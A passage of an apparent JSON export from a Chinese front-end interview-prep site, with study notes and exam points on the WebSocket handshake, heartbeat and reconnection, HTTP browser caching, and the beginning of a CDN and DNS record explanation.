shitsocket。\n\n然后， Sec-WebSocket-Accept 这个则是经过服务器确认，并且加密过后的 Sec-WebSocket-Key 。 服务器：好啦好啦，知道啦，给你看我的 ID CARD 来证明行了吧。\n\n后面的， Sec-WebSocket-Protocol 则是表示最终使用的协议。\n\n至此，HTTP 已经完成它所有工作了，接下来就是完全按照 WebSocket 协议进行了。\n\n总结，**WebSocket连接的过程是：**\n\n首先，客户端发起http请求，经过3次握手后，建立起TCP连接；http请求里存放WebSocket支持的版本号等信息，如：Upgrade、Connection、WebSocket-Version等；\n\n然后，服务器收到客户端的握手请求后，同样采用HTTP协议回馈数据；\n\n最后，客户端收到连接成功的消息后，开始借助于TCP传输信道进行全双工通信。\n\n## 四、Websocket的优缺点\n\n**优点：**\n\n* WebSocket协议一旦建议后，互相沟通所消耗的请求头是很小的\n* 服务器可以向客户端推送消息了\n\n**缺点：**\n\n* 少部分浏览器不支持，浏览器支持的程度与方式有区别（IE10）\n\n## 五、WebSocket应用场景\n\n* 即时聊天通信\n* 多玩家游戏\n* 在线协同编辑/编辑\n* 实时数据流的拉取与推送\n* 体育/游戏实况\n* 实时地图位置\n* 即时`Web`应用程序：即时`Web`应用程序使用一个`Web`套接字在客户端显示数据，这些数据由后端服务器连续发送。在`WebSocke`t中，数据被连续推送/传输到已经打开的同一连接中，这就是为什么`WebSocket`更快并提高了应用程序性能的原因。 例如在交易网站或比特币交易中，这是最不稳定的事情，它用于显示价格波动，数据被后端服务器使用Web套接字通道连续推送到客户端。\n* 游戏应用程序：在游戏应用程序中，你可能会注意到，服务器会持续接收数据，而不会刷新用户界面。屏幕上的用户界面会自动刷新，而且不需要建立新的连接，因此在`WebSocket`游戏应用程序中非常有帮助。\n* 聊天应用程序：聊天应用程序仅使用`WebSocket`建立一次连接，便能在订阅户之间交换，发布和广播消息。它重复使用相同的`WebSocket`连接，用于发送和接收消息以及一对一的消息传输。\n\n### 不能使用WebSocket的场景\n\n如果我们需要通过网络传输的任何实时更新或连续数据流，则可以使用`WebSocket`。如果我们要获取旧数据，或者只想获取一次数据供应用程序使用，则应该使用`HTTP`协议，不需要很频繁或仅获取一次的数据可以通过简单的`HTTP`请求查询，因此在这种情况下最好不要使用`WebSocket`。\n\n注意：如果仅加载一次数据，则`RESTful` `Web`服务足以从服务器获取数据。\n\n## 六、websocket 断线重连\n\n心跳就是客户端定时的给服务端发送消息，证明客户端是在线的， 如果超过一定的时间没有发送则就是离线了。\n\n### 如何判断在线离线？\n\n当客户端第一次发送请求至服务端时会携带唯一标识、以及时间戳，服务端到db或者缓存去查询改请求的唯一标识，如果不存在就存入db或者缓存中，\n\n第二次客户端定时再次发送请求依旧携带唯一标识、以及时间戳，服务端到db或者缓存去查询改请求的唯一标识，如果存在就把上次的时间戳拿取出来，使用当前时间戳减去上次的时间，\n\n得出的毫秒秒数判断是否大于指定的时间，若小于的话就是在线，否则就是离线；\n\n### 如何解决断线问题\n\n通过查阅资料了解到 nginx 代理的 websocket 转发，无消息连接会出现超时断开问题。网上资料提到解决方案两种，一种是修改nginx配置信息，第二种是websocket发送心跳包。\n\n下面就来总结一下本次项目实践中解决的websocket的断线 和 重连 这两个问题的解决方案。\n\n主动触发包括主动断开连接，客户端主动发送消息给后端\n\n1. 主动断开连接\n\n```\nws.close();\n\n```\n\n主动断开连接，根据需要使用，基本很少用到。\n\n2. 主动发送消息\n\n```\nws.send(\"hello world\");\n\n```\n\n针对websocket断线我们来分析一下，\n\n* 断线的可能原因1：websocket超时没有消息自动断开连接，应对措施：\n\n  这时候我们就需要知道服务端设置的超时时长是多少，在小于超时时间内发送心跳包，有2中方案:一种是客户端主动发送上行心跳包，另一种方案是服务端主动发送下行心跳包。\n\n  下面主要讲一下客户端也就是前端如何实现心跳包：\n\n  首先了解一下心跳包机制\n\n  跳包之所以叫心跳包是因为：它像心跳一样每隔固定时间发一次，以此来告诉服务器，这个客户端还活着。事实上这是为了保持长连接，至于这个包的内容，是没有什么特别规定的，不过一般都是很小的包，或者只包含包头的一个空包。\n\n  在TCP的机制里面，本身是存在有心跳包的机制的，也就是TCP的选项：SO\\_KEEPALIVE。系统默认是设置的2小时的心跳频率。但是它检查不到机器断电、网线拔出、防火墙这些断线。而且逻辑层处理断线可能也不是那么好处理。一般，如果只是用于保活还是可以的。\n\n  心跳包一般来说都是在逻辑层发送空的echo包来实现的。`下一个定时器，在一定时间间隔下发送一个空包给客户端，然后客户端反馈一个同样的空包回来，服务器如果在一定时间内收不到客户端发送过来的反馈包，那就只有认定说掉线了。`\n\n  在长连接下，有可能很长一段时间都没有数据往来。理论上说，这个连接是一直保持连接的，但是实际情况中，如果中间节点出现什么故障是难以知道的。更要命的是，有的节点(防火墙)会自动把一定时间之内没有数据交互的连接给断掉。在这个时候，就需要我们的心跳包了，用于维持长连接，保活。\n\n  心跳检测步骤：\n\n  1. 客户端每隔一个时间间隔发生一个探测包给服务器\n  2. 客户端发包时启动一个超时定时器\n  3. 服务器端接收到检测包，应该回应一个包\n  4. 如果客户机收到服务器的应答包，则说明服务器正常，删除超时定时器\n  5. 如果客户端的超时定时器超时，依然没有收到应答包，则说明服务器挂了\n\n  ```js\n  // 前端解决方案：心跳检测\n  var heartCheck = {\n      timeout: 30000, //30秒发一次心跳\n      timeoutObj: null,\n      serverTimeoutObj: null,\n      reset: function(){\n          clearTimeout(this.timeoutObj);\n          clearTimeout(this.serverTimeoutObj);\n          return this;\n      },\n      start: function(){\n          var self = this;\n          this.timeoutObj = setTimeout(function(){\n              //这里发送一个心跳，后端收到后，返回一个心跳消息，\n              //onmessage拿到返回的心跳就说明连接正常\n              ws.send(\"ping\");\n              console.log(\"ping!\")\n\n              self.serverTimeoutObj = setTimeout(function(){//如果超过一定时间还没重置，说明后端主动断开了\n                  ws.close(); //如果onclose会执行reconnect，我们执行ws.close()就行了.如果直接执行reconnect 会触发onclose导致重连两次\n              }, self.timeout);\n          }, this.timeout);\n      }\n  }\n\n  ```\n* 断线的可能原因2：websocket异常包括服务端出现中断，交互切屏等等客户端异常中断等等\n\n  当若服务端宕机了，客户端怎么做、服务端再次上线时怎么做？\n\n  客户端则需要断开连接，通过onclose 关闭连接，服务端再次上线时则需要清除之间存的数据，若不清除 则会造成只要请求到服务端的都会被视为离线。\n\n  针对这种异常的中断解决方案就是处理重连，下面我们给出的重连方案是使用js库处理：引入reconnecting-websocket.min.js，ws建立链接方法使用js库api方法：\n\n  ```js\n  var ws = new ReconnectingWebSocket(url);\n  // 断线重连：\n  reconnectSocket(){\n      if ('ws' in window) {\n          ws = new ReconnectingWebSocket(url);\n      } else if ('MozWebSocket' in window) {\n         ws = new MozWebSocket(url);\n      } else {\n        ws = new SockJS(url);\n      }\n  }\n\n  ```\n\n  断网监测支持使用js库：offline.min.js\n\n  ```js\n  onLineCheck(){\n      Offline.check();\n      console.log(Offline.state,'---Offline.state');\n      console.log(this.socketStatus,'---this.socketStatus');\n\n      if(!this.socketStatus){\n          console.log('网络连接已断开！');\n          if(Offline.state === 'up' && websocket.reconnectAttempts > websocket.maxReconnectInterval){\n              window.location.reload();\n          }\n          reconnectSocket();\n      }else{\n          console.log('网络连接成功！');\n          websocket.send(\"heartBeat\");\n      }\n  }\n\n  // 使用：在websocket断开链接时调用网络中断监测\n  websocket.onclose => () {\n      onLineCheck();\n  };\n\n  ```\n\n  以上方案，只是抛砖引玉，如果大家有更好的解决方案欢迎评论区分享交流。\n\n## 七、总结\n\n* WebSocket 是为了在 web 应用上进行双通道通信而产生的协议，相比于轮询HTTP请求的方式，WebSocket 有节省服务器资源，效率高等优点。\n* WebSocket 中的掩码是为了防止早期版本中存在中间缓存污染攻击等问题而设置的，客户端向服务端发送数据需要掩码，服务端向客户端发送数据不需要掩码。\n* WebSocket 中 Sec-WebSocket-Key 的生成算法是拼接服务端和客户端生成的字符串，进行SHA1哈希算法，再用base64编码。\n* WebSocket 协议握手是依靠 HTTP 协议的，依靠于 HTTP 响应101进行协议升级转换。",
    "testPoint": "**WebSocket** 是常考的实时通信技术，面试官通常会从其**原理、与 HTTP 的关系、使用方式、应用场景、安全性、性能优化**等方向进行考察。以下是系统整理的 **WebSocket 考察点大全**：\n\n---\n\n## 一、基础概念考察\n\n| 考察点            | 要点                                               |\n| -------------- | ------------------------------------------------ |\n| WebSocket 是什么？ | 是一种**基于 TCP 的全双工通信协议**，用于客户端与服务端建立持久连接           |\n| 解决了什么问题？       | 解决了 HTTP 无法实现真正实时通信、轮询/长轮询开销大的问题                 |\n| 属于哪一层协议？       | 基于 **TCP 之上的应用层协议**，协议名称是 `ws://`（或加密的 `wss://`） |\n\n---\n\n## 二、与 HTTP 的关系\n\n| 考察点          | 要点                                                               |\n| ------------ | ---------------------------------------------------------------- |\n| 如何建立连接？      | 使用 HTTP 协议的 **Upgrade 机制** 进行握手，成功后协议变为 WebSocket                |\n| 建立连接过程       | 客户端发起包含 `Upgrade: websocket` 的请求，服务端返回 `101 Switching Protocols` |\n| 与 HTTP 的区别   | HTTP 是 **单向请求响应**，WebSocket 是 **双向持续通信**                         |\n| 与 HTTP/2 的区别 | WebSocket 不能直接复用 HTTP/2，需要独立连接                                   |\n\n---\n\n## 三、使用与 API 考察\n\n| 考察点            | 要点                                                 |\n| -------------- | -------------------------------------------------- |\n| WebSocket 创建方式 | `const socket = new WebSocket('ws://example.com')` |\n| 常用事件           | `onopen`、`onmessage`、`onclose`、`onerror`           |\n| 发送数据           | `socket.send(data)`                                |\n| 关闭连接           | `socket.close(code, reason)`                       |\n| 消息格式           | 支持字符串、`Blob`、`ArrayBuffer` 等格式                     |\n\n---\n\n## 四、应用场景考察\n\n| 场景           | 原因       |\n| ------------ | -------- |\n| 实时聊天、弹幕、在线游戏 | 高实时性，低延迟 |\n| 股票、彩票、竞价系统   | 实时数据推送   |\n| 协同编辑（如在线文档）  | 多端状态同步   |\n| 物联网设备通讯      | 双向通信能力   |\n\n---\n\n## 五、与其他通信方案对比\n\n| 特性     | HTTP 轮询 | SSE（Server-Sent Events） | WebSocket    |\n| ------ | ------- | ----------------------- | ------------ |\n| 双向通信   | 否       | 否                       | ✅ 是          |\n| 单连接复用  | ❌ 否     | ✅ 是（只接收）                | ✅ 是（双向）      |\n| 延迟性能   | 高       | 中                       | ✅ 低（最快）      |\n| 浏览器兼容性 | ✅ 普遍支持  | 部分旧版 IE 不支持             | ✅ 普遍支持       |\n| 断线重连   | ❌ 需手动实现 | ✅ 内建支持                  | ❌ 需手动实现或封装处理 |\n\n---\n\n## 六、断线重连与心跳机制\n\n### 考察点\n\n* 为什么需要心跳？ → 检测客户端是否在线，防止中间网络断开但不通知。\n* 如何实现？\n\n  * 客户端定时发送 `\"ping\"` 或自定义心跳包\n  * 服务端超时未收到则断开连接\n* 断线重连策略\n\n  * 实现自动重连（如指数退避重连）\n  * 避免频繁重连导致服务器压力过大\n\n---\n\n## 七、安全性考察\n\n| 考察点    | 要点                               |\n| ------ | -------------------------------- |\n| 加密版本   | 使用 `wss://`（相当于 HTTPS），基于 TLS 加密 |\n| 身份认证   | 一般通过握手时携带 `token/cookie` 完成认证    |\n| 跨域支持   | 默认支持跨域（同源限制不严格）                  |\n| 被动关闭连接 | 网络断开、浏览器关闭页面、服务器断开               |\n| DoS 防护 | 服务端需做连接数限制和身份验证，防止连接滥用           |\n\n---\n\n## 八、服务端实现方案（了解为加分项）\n\n| 技术                 | 特点                                 |\n| ------------------ | ---------------------------------- |\n| Node.js + ws       | 简单、适合轻量服务                          |\n| Socket.io          | 封装了 WebSocket，支持断线重连、fallback、事件系统 |\n| Go / Java / Python | 多种语言有成熟框架                          |\n\n---\n\n## 九、面试常见问题示例\n\n| 问题                    | 考察方向          |\n| --------------------- | ------------- |\n| WebSocket 如何建立连接？     | 握手流程、Upgrade  |\n| WebSocket 与 HTTP 的区别？ | 通信模式、连接状态     |\n| WebSocket 有哪些使用场景？    | 实时应用、双向通信     |\n| 如何处理 WebSocket 的断线重连？ | 重连机制、心跳包      |\n| WebSocket 如何鉴权？       | 握手参数、token 认证 |\n| WebSocket 与 SSE 有何区别？ | 单向 vs 双向、兼容性  |",
    "exerciseKeyList": "[\"95185ca6-291f-4160-b65d-f291dfdf8a4f\",\"6100dbed-3600-470f-90b1-b1c6ef213a52\",\"68137df5-8569-4ae7-8c01-3b30419cf537\",\"14ad497b-56ee-461b-8c82-110f4d1c04b0\",\"4449a399-c20d-49e7-aac6-05236ee28662\",\"013a77b6-e97b-4271-9e1b-9d632783979d\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-07-28T04:19:04.000Z",
    "updateAt": "2025-08-06T06:39:32.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "013a77b6-e97b-4271-9e1b-9d632783979d",
        "title": "介绍下WebSocket",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T15:59:38.000Z",
        "updateAt": "2024-07-19T18:02:12.000Z"
      },
      {
        "exerciseKey": "14ad497b-56ee-461b-8c82-110f4d1c04b0",
        "title": "WebSocket 中的心跳是为了解决什么问题？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T07:57:37.000Z",
        "updateAt": "2021-07-11T16:10:36.000Z"
      },
      {
        "exerciseKey": "4449a399-c20d-49e7-aac6-05236ee28662",
        "title": "说说对 WebSocket 的了解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T07:42:10.000Z",
        "updateAt": "2024-08-10T17:05:25.000Z"
      },
      {
        "exerciseKey": "6100dbed-3600-470f-90b1-b1c6ef213a52",
        "title": "webSocket 有哪些安全问题，应该如何应对？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:41:22.000Z",
        "updateAt": "2024-08-10T17:07:02.000Z"
      },
      {
        "exerciseKey": "68137df5-8569-4ae7-8c01-3b30419cf537",
        "title": "说说WebSocket和HTTP的区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-06T14:08:39.000Z",
        "updateAt": "2024-08-10T17:06:35.000Z"
      },
      {
        "exerciseKey": "95185ca6-291f-4160-b65d-f291dfdf8a4f",
        "title": "说下 websocket 的连接原理",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-24T01:24:25.000Z",
        "updateAt": "2024-08-10T17:07:21.000Z"
      }
    ]
  },
  "242": {
    "id": 242,
    "tagId": 16,
    "title": "浏览器的缓存机制解析",
    "explanation": "#### 概述\n\n浏览器的缓存机制也就是我们说的HTTP缓存机制，其机制是根据HTTP报文的缓存标识进行的，所以在分析浏览器缓存机制之前，我们先使用图文简单介绍一下HTTP报文，HTTP报文分为两种：\n\nHTTP请求(Request)报文，报文格式为：请求行 – HTTP头(通用信息头，请求头，实体头) – 请求报文主体(只有POST才有报文主体)，如下图\n\n![](https://static.ecool.fun//article/de8d369c-93b5-49db-9b09-e7f98f120a83.awebp)\n\n![](https://static.ecool.fun//article/c5f1fb0e-361f-4e74-90ab-5c46b5349090.awebp)\n\nHTTP响应(Response)报文，报文格式为：状态行 – HTTP头(通用信息头，响应头，实体头) – 响应报文主体，如下图\n\n![](https://static.ecool.fun//article/db24587c-d8c5-4d21-86d9-66d1ae0d6d67.awebp)\n\n![](https://static.ecool.fun//article/ae5909be-cff6-4a30-9e9d-237c9f69b95d.awebp)\n\n注：通用信息头指的是请求和响应报文都支持的头域，分别为Cache-Control、Connection、Date、Pragma、Transfer-Encoding、Upgrade、Via；实体头则是实体信息的实体头域，分别为Allow、Content-Base、Content-Encoding、Content-Language、Content-Length、Content-Location、Content-MD5、Content-Range、Content-Type、Etag、Expires、Last-Modified、extension-header。这里只是为了方便理解，将通用信息头，响应头/请求头，实体头都归为了HTTP头。\n\n以上的概念在这里我们不做多讲解，只简单介绍，有兴趣的童鞋可以自行研究。\n\n#### 缓存过程分析\n\n浏览器与服务器通信的方式为应答模式，即是：浏览器发起HTTP请求 – 服务器响应该请求。那么浏览器第一次向服务器发起该请求后拿到请求结果，会根据响应报文中HTTP头的缓存标识，决定是否缓存结果，是则将请求结果和缓存标识存入浏览器缓存中，简单的过程如下图：\n\n![](https://static.ecool.fun//article/0ff29d66-dbf1-43eb-a926-dfc7feeb6a0b.awebp)\n\n由上图我们可以知道：\n\n* 浏览器每次发起请求，都会先在浏览器缓存中查找该请求的结果以及缓存标识\n* 浏览器每次拿到返回的请求结果都会将该结果和缓存标识存入浏览器缓存中\n\n以上两点结论就是浏览器缓存机制的关键，他确保了每个请求的缓存存入与读取，只要我们再理解浏览器缓存的使用规则，那么所有的问题就迎刃而解了，本文也将围绕着这点进行详细分析。为了方便大家理解，这里我们根据是否需要向服务器重新发起HTTP请求将缓存过程分为两个部分，分别是强制缓存和协商缓存。\n\n##### 强制缓存\n\n强制缓存就是向浏览器缓存查找该请求结果，并根据该结果的缓存规则来决定是否使用该缓存结果的过程，强制缓存的情况主要有三种(暂不分析协商缓存过程)，如下：\n\n不存在该缓存结果和缓存标识，强制缓存失效，则直接向服务器发起请求（跟第一次发起请求一致），如下图：\n\n![](https://static.ecool.fun//article/26e3ee78-b7a1-49e4-af49-c09480d7e6a7.awebp)\n\n存在该缓存结果和缓存标识，但该结果已失效，强制缓存失效，则使用协商缓存(暂不分析)，如下图\n\n![](https://static.ecool.fun//article/c8c77db5-c63a-4dd5-9d9a-144f589549c9.awebp)\n\n存在该缓存结果和缓存标识，且该结果尚未失效，强制缓存生效，直接返回该结果，如下图\n\n![](https://static.ecool.fun//article/ae6d0410-6fd6-44a9-b8ea-5cdf452928e3.awebp)\n> 那么强制缓存的缓存规则是什么？\n\n当浏览器向服务器发起请求时，服务器会将缓存规则放入HTTP响应报文的HTTP头中和请求结果一起返回给浏览器，控制强制缓存的字段分别是Expires和Cache-Control，其中Cache-Control优先级比Expires高。\n\n##### Expires\n\nExpires是HTTP/1.0控制网页缓存的字段，其值为服务器返回该请求结果缓存的到期时间，即再次发起该请求时，如果客户端的时间小于Expires的值时，直接使用缓存结果。\n\n> Expires是HTTP/1.0的字段，但是现在浏览器默认使用的是HTTP/1.1，那么在HTTP/1.1中网页缓存还是否由Expires控制？\n\n到了HTTP/1.1，Expire已经被Cache-Control替代，原因在于Expires控制缓存的原理是使用客户端的时间与服务端返回的时间做对比，那么如果客户端与服务端的时间因为某些原因（例如时区不同；客户端和服务端有一方的时间不准确）发生误差，那么强制缓存则会直接失效，这样的话强制缓存的存在则毫无意义，那么Cache-Control又是如何控制的呢？\n\n##### Cache-Control\n\n在HTTP/1.1中，Cache-Control是最重要的规则，主要用于控制网页缓存，主要取值为：\n\n* public：所有内容都将被缓存（客户端和代理服务器都可缓存）\n* private：所有内容只有客户端可以缓存，Cache-Control的默认取值\n* no-cache：客户端缓存内容，但是是否使用缓存则需要经过协商缓存来验证决定\n* no-store：所有内容都不会被缓存，即不使用强制缓存，也不使用协商缓存\n* max-age=xxx (xxx is numeric)：缓存内容将在xxx秒后失效\n\n接下来，我们直接看一个例子，如下：\n\n![](https://static.ecool.fun//article/c65f2e1a-d796-4eab-9353-09054cdbc8ed.awebp)\n\n由上面的例子我们可以知道：\n\n* HTTP响应报文中expires的时间值，是一个绝对值\n* HTTP响应报文中Cache-Control为max-age=600，是相对值\n\n由于Cache-Control的优先级比expires，那么直接根据Cache-Control的值进行缓存，意思就是说在600秒内再次发起该请求，则会直接使用缓存结果，强制缓存生效。\n\n注：在无法确定客户端的时间是否与服务端的时间同步的情况下，Cache-Control相比于expires是更好的选择，所以同时存在时，只有Cache-Control生效。\n\n了解强制缓存的过程后，我们拓展性的思考一下：\n\n> 浏览器的缓存存放在哪里，如何在浏览器中判断强制缓存是否生效？\n\n![](https://static.ecool.fun//article/e47c6976-8e4d-4b29-9c2a-c6629e7bec5d.awebp)\n\n这里我们以博客的请求为例，状态码为灰色的请求则代表使用了强制缓存，请求对应的Size值则代表该缓存存放的位置，分别为from memory cache 和 from disk cache。\n\n> 那么from memory cache 和 from disk cache又分别代表的是什么呢？什么时候会使用from disk cache，什么时候会使用from memory cache呢？\n\nfrom memory cache代表使用内存中的缓存，from disk cache则代表使用的是硬盘中的缓存，浏览器读取缓存的顺序为memory –> disk。\n\n虽然我已经直接把结论说出来了，但是相信有不少人对此不能理解，那么接下来我们一起详细分析一下缓存读取问题，这里仍让以我的博客为例进行分析：\n\n访问https://heyingye.github.io/ –> 200 –> 关闭博客的标签页 –> 重新打开https://heyingye.github.io/ –> 200(from disk cache) –> 刷新 –> 200(from memory cache)\n\n过程如下：\n\n* 访问https://heyingye.github.io/\n\n  ![](https://static.ecool.fun//article/65fab246-8122-4b31-901b-32dde42bb6b9.awebp)\n* 关闭博客的标签页\n* 重新打开https://heyingye.github.io/\n\n  ![](https://static.ecool.fun//article/e30012a4-ccf8-454d-9c74-f82a305fda08.awebp)\n* 刷新\n\n  ![](https://static.ecool.fun//article/397e5037-5bce-4be7-86c3-75e239aedb4b.awebp)\n\n  from disk memory\n\n> 看到这里可能有人小伙伴问了，最后一个步骤刷新的时候，不是同时存在着from disk cache和from memory cache吗？\n\n对于这个问题，我们需要了解内存缓存(from memory cache)和硬盘缓存(from disk cache)，如下:\n\n* 内存缓存(from memory cache)：内存缓存具有两个特点，分别是快速读取和时效性：\n* 快速读取：内存缓存会将编译解析后的文件，直接存入该进程的内存中，占据该进程一定的内存资源，以方便下次运行使用时的快速读取。\n* 时效性：一旦该进程关闭，则该进程的内存则会清空。\n* 硬盘缓存(from disk cache)：硬盘缓存则是直接将缓存写入硬盘文件中，读取缓存需要对该缓存存放的硬盘文件进行I/O操作，然后重新解析该缓存内容，读取复杂，速度比内存缓存慢。\n\n在浏览器中，浏览器会在js和图片等文件解析执行后直接存入内存缓存中，那么当刷新页面时只需直接从内存缓存中读取(from memory cache)；而css文件则会存入硬盘文件中，所以每次渲染页面都需要从硬盘读取缓存(from disk cache)。\n\n#### 协商缓存\n\n协商缓存就是强制缓存失效后，浏览器携带缓存标识向服务器发起请求，由服务器根据缓存标识决定是否使用缓存的过程，主要有以下两种情况：\n\n协商缓存生效，返回304，如下\n\n![](https://static.ecool.fun//article/19a96fdd-be3d-4165-a5e7-3a9f44e2bb90.awebp)\n\n##### 304\n\n协商缓存失效，返回200和请求结果结果，如下\n\n![](https://static.ecool.fun//article/5715a8c5-5c3c-4550-857b-df2a2616086c.awebp)\n\n##### 200\n\n同样，协商缓存的标识也是在响应报文的HTTP头中和请求结果一起返回给浏览器的，控制协商缓存的字段分别有：Last-Modified / If-Modified-Since和Etag / If-None-Match，其中Etag / If-None-Match的优先级比Last-Modified / If-Modified-Since高。\n\n##### Last-Modified / If-Modified-Since\n\nLast-Modified是服务器响应请求时，返回该资源文件在服务器最后被修改的时间，如下。\n\n![](https://static.ecool.fun//article/4dcad5ce-00e2-42d6-a52e-8cadaf30892d.awebp)\n\n##### last-modify\n\nIf-Modified-Since则是客户端再次发起该请求时，携带上次请求返回的Last-Modified值，通过此字段值告诉服务器该资源上次请求返回的最后被修改时间。服务器收到该请求，发现请求头含有If-Modified-Since字段，则会根据If-Modified-Since的字段值与该资源在服务器的最后被修改时间做对比，若服务器的资源最后被修改时间大于If-Modified-Since的字段值，则重新返回资源，状态码为200；否则则返回304，代表资源无更新，可继续使用缓存文件，如下。\n\n![](https://static.ecool.fun//article/dc579c73-8f2b-4398-aaf7-7d47f630cd80.awebp)\n\n##### If-Modified-Since\n\n##### Etag / If-None-Match\n\nEtag是服务器响应请求时，返回当前资源文件的一个唯一标识(由服务器生成)，如下。\n\n![](https://static.ecool.fun//article/00ee13ff-d2f1-4990-899a-38cd35e4a773.awebp)\n\n##### Etag\n\nIf-None-Match是客户端再次发起该请求时，携带上次请求返回的唯一标识Etag值，通过此字段值告诉服务器该资源上次请求返回的唯一标识值。服务器收到该请求后，发现该请求头中含有If-None-Match，则会根据If-None-Match的字段值与该资源在服务器的Etag值做对比，一致则返回304，代表资源无更新，继续使用缓存文件；不一致则重新返回资源文件，状态码为200，如下。\n\n![](https://static.ecool.fun//article/9bd8c932-2c56-44bf-9a81-6866412e5438.awebp)\n\nEtag-match\n\n注：Etag / If-None-Match优先级高于Last-Modified / If-Modified-Since，同时存在则只有Etag / If-None-Match生效。",
    "testPoint": " ## 一、缓存分类（核心知识点）\n\n### 1. **强缓存（强制缓存 / 本地缓存）**\n\n* 特点：**浏览器不发请求**，直接使用本地缓存。\n* 响应状态码：`200 (from disk cache)` 或 `200 (from memory cache)`\n* 相关响应头：\n\n  * `Expires`（HTTP/1.0，绝对时间）\n  * `Cache-Control: max-age=xxx`（HTTP/1.1，相对时间）\n\n### 2. **协商缓存**\n\n* 特点：**浏览器发送请求**，由服务器判断是否可用缓存。\n* 响应状态码：\n\n  * `304 Not Modified` → 命中协商缓存\n* 相关响应头：\n\n  * 请求头：`If-Modified-Since`、`If-None-Match`\n  * 响应头：`Last-Modified`、`ETag`   \n\n## 二、缓存位置分类\n\n| 缓存位置              | 特点                 |\n| ----------------- | ------------------ |\n| 内存缓存（memory）      | 页面未关闭时的内存中缓存，优先级最高 |\n| 硬盘缓存（disk）        | 关闭页面或 tab 后仍可保留    |\n| Service Worker 缓存 | 可离线使用，自定义控制        |\n| 浏览器堆叠层级缓存         | 比如预渲染、预加载等特殊策略     |\n\n\n## 三、响应头字段考察\n\n### `Cache-Control`（最重要）\n\n常见取值组合：\n\n* `no-cache`：**协商缓存**，需要请求验证\n* `no-store`：**禁止缓存**\n* `public`：允许任何中间层缓存\n* `private`：仅浏览器私有缓存\n* `max-age=3600`：缓存时间（秒）\n\n### `Expires`\n\n* GMT 格式的过期时间，HTTP/1.0 使用，已被 `Cache-Control` 替代。\n\n### `ETag` 与 `Last-Modified`\n\n* `ETag`: 基于文件内容生成的 hash 标识，精度更高。\n* `Last-Modified`: 基于修改时间，精度较低，可能存在误判。\n\n## 四、缓存优先级\n\n浏览器优先读取顺序：\n\n```\nService Worker 缓存 > Memory Cache > Disk Cache > 请求服务器\n```\n\n\n## 五、常见缓存策略考察\n\n### 静态资源使用强缓存 + 文件名 hash\n\n* 使用 `Cache-Control: max-age=31536000, immutable`\n* 文件更新后文件名变更（`app.ab12.js` → `app.cd34.js`）\n\n### 动态接口使用协商缓存\n\n* `ETag` 或 `Last-Modified` 控制 API 返回结果是否更新\n\n### HTML 通常不使用强缓存\n\n* 避免首页更新被缓存 → 设置为 `no-cache` 或短时间缓存\n\n\n## 六、与 Service Worker 的关系\n\n* 可以脱离网络运行，缓存策略更灵活（如 Cache First、Network First）\n* 适用于离线场景、PWA 应用\n\n\n## 七、缓存失效的场景\n\n* `Ctrl + F5` 强制刷新：**跳过所有缓存**\n* `F5` 普通刷新：跳过强缓存，触发协商缓存\n* 地址变更（URL 参数不同）\n* HTTP 响应头设置禁止缓存\n\n## 八、面试常见问题示例\n\n| 面试问题                        | 涉及考点                              |\n| --------------------------- | --------------------------------- |\n| 浏览器强缓存和协商缓存的区别？             | 状态码、是否请求服务器                       |\n| Cache-Control 常见取值有哪些？      | `no-cache`, `no-store`, `max-age` |\n| ETag 与 Last-Modified 有什么区别？ | 精度、性能、误判可能性                       |\n| HTML 页面应该如何设置缓存策略？          | 通常设置为 `no-cache`                  |\n| 浏览器缓存有哪些层级？                 | memory、disk、Service Worker        |\n| 如何设计静态资源缓存方案？               | 文件名加 hash，配置强缓存头                  |\n\n## 九、总结表格\n\n| 类型   | 是否发请求 | 状态码              | 关键头部字段                     |\n| ---- | ----- | ---------------- | -------------------------- |\n| 强缓存  | 否     | 200 (from cache) | `Cache-Control`, `Expires` |\n| 协商缓存 | 是     | 304              | `If-None-Match`, `ETag`    |\n| 非缓存  | 是     | 200              | `no-store`，或没有缓存头          |",
    "exerciseKeyList": "[\"ac644e0a-1fbe-4e0a-9f9f-ecc373a13a87\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-07-28T05:50:42.000Z",
    "updateAt": "2025-08-06T06:32:16.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "ac644e0a-1fbe-4e0a-9f9f-ecc373a13a87",
        "title": "浏览器有哪几种缓存，各种缓存的优先级是什么样的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-30T01:06:05.000Z",
        "updateAt": "2024-08-10T17:07:26.000Z"
      }
    ]
  },
  "243": {
    "id": 243,
    "tagId": 16,
    "title": "CDN原理",
    "explanation": "### CDN\n\nCDN 即内容分发网络（Content Delivery Network）的简称，是建立在承载网基础上的虚拟分布式网络，能够将源站内容（包括各类动静态资源）智能缓存到全球各节点服务器上。这样不仅方便了用户就近获取内容，提高了资源的访问速度，也分担了源站压力。\n\n### CNAME、A 记录、NS 记录\n\nDNS ( Domain Name System，域名系统)提供了将域名转换为 IP 地址的服务。为了完成这个转化工作，DNS 的数据库中需要维护相关的数据，这些数据被叫做 RR（Resource Record，资源记录）。资源记录有很多种类型，比如 A、NS、SOA、CNAME 和 PTR 记录。\n\n大家接触最多的就是 A（Address）记录。A 记录是一条从域名到 IP 地址的映射记录。而 CNAME（Canonical Name）记录是一条从域名到域名的映射记录。它在 CDN 技术中有举足轻重的作用，很好地实现了业务域名与 CDN 系统域名的解耦。简单理解，如果一个域名配置了 A 记录，DNS 就会把它解析成 A 记录指定的 IP 地址；如果一个域名配置了 CNAME 记录，DNS 就会把它解析成 CNAME 记录指定的另外一个域名；A 记录和 CNAME 记录是互斥的，不能同时存在。\n\nNS （Name Server）记录是和 DNS 服务器相关的一条记录，它指定该域名应该由哪一台 DNS 服务器进行解析。一般把通过 NS 记录指定的 DNS 服务器叫做该域名的权威 DNS 服务器。\n\n### 加速域名\n\n加速域名指需要使用 CDN 加速的域名。加速域名也是一个域名。加速域名一般配置 CNAME 记录，指向 CDN 